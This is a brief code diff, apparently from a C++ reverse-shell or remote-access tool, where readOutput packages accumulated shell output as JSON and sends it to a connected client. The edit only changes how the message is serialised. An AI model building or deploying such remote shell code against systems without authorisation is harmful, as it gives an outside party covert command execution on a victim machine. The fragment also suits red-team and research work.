@@ -55,7 +55,7 @@ void ReverseShell::readOutput() {
                 nlohmann::json jsonObject;
                 jsonObject["RESPONSE"] = "SHELL";
                 jsonObject["result"] = accumulatedOutput;
-                clientSocket.sendMessage(jsonObject.dump(1, ' ',true,nlohmann::json::error_handler_t::replace));
+                clientSocket.sendMessage(jsonObject);
                 accumulatedOutput.clear();
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(100));
